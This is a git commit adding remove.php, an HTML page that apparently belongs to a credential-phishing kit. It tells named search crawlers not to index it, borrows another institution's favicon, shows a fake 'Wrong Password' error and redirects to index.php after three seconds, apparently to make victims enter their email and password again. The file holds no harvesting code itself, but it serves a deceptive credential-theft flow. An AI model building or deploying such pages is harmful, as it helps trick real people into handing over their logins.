39261e93adc16bec4b5f8aff94ce709c75a5d20a
statemind11 <juliette.stanton@loganschool.net>
2024-11-05 09:14:06 +0100

    Add files via upload

---
+++ remove.php
@@ -0,0 +1,43 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+<meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
+    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
+    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
+    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
+    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
+<link rel="shortcut icon" href="https://www.firb.br/firb/images/favicon.ico"/>
+
+
+
+<meta charset="utf-8">
+
+<title>Wrong Password</title>
+	<link rel="stylesheet" href="css/wait.css">
+
+<style type="text/css">
+body {
+	width: 100%;
+}
+
+img {
+	text-align: center;
+}
+
+h1 {
+	text-align: center;
+	color: #000;
+	text-shadow: 1px 1px 1px #fff;
+}
+
+.style1 {color: #FDA624}
+</style>
+<body>
+<center>
+</center>
+<h1 class="style1">Please check your Email Address or Wrong is Password...</h1>
+<meta http-equiv="refresh" content="3; url=index.php" />
+</body></html>
+
